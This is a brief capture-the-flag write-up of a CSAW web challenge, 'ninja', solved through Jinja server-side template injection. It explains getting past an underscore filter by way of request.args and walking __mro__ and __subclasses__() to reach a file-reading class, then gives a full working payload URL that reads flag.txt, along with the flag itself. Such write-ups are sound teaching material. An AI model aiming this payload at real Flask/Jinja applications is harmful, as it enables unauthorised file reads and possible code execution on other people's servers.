# ninja

### Description

## Solution

In short this is a Jinja Server Side Template Injection Attack. 
I have done a few of these before but I'm still not very well versed in it.
Luckily I managed to find this wonderful [resource](http://web.chal.csaw.io:5000/), that guided me through.

Some Pointers
1. Since they disable putting in `_`, you have to use `request.args` to inject them back in
2. The standard technique is to `__mro__` to get to the base class, and then `__subclass__()` to get a list of all the classes. You can then access all the libraries from there.
3. I guessed that the flag is in `flag.txt` (Quite common for a few CTFs), and read it. Surprisingly, I managed to get the flag.

Payload: `http://web.chal.csaw.io:5000/submit?value={{request[request.args.param][request.args.p][-1][request.args.subclasses]()[40](%22flag.txt%22).read()%20}}&param=__class__&p=__mro__&dict=__dict__&subclasses=__subclasses__`

## Flag

`flag{m0mmy_s33_1m_4_r34l_n1nj4}`
